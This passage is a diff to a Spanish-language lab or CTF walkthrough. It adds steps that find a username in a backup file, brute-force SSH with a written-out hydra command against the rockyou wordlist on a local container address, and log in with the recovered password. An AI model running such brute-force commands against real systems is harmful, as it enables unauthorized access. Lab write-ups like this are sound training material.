@@ -107,4 +107,17 @@ Starting gobuster in directory enumeration mode
 ```
 Dentro del direcctorio **/backup** hay un archivo *.txt* que si lo abrimos tenemos imformación importante.
 
-![image](https://github.com/user-attachments/assets/5c269196-145e-4960-8b9d-7e269fdbf0ec)
+![image](https://github.com/user-attachments/assets/565355b9-55c3-4d29-9fd1-dc688c1c32d1)
+
+Ya tenemos un posible usuario ***russoski***, así que como teníamos el puerto 22 abierto vamos a probar con hydra y fuerza bruta a conectarnos.
+```
+hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+Obtenemos la contraseña **iloveme** y nos conectamos con el usuario **russoski**
+
+![image](https://github.com/user-attachments/assets/3783b387-3dc9-453a-a250-bbaea68587bf)
+
+```
+ssh russoski@172.17.0.2
+```
+![image](https://github.com/user-attachments/assets/9845a17f-484d-46fc-8ec5-40acc68ed421)
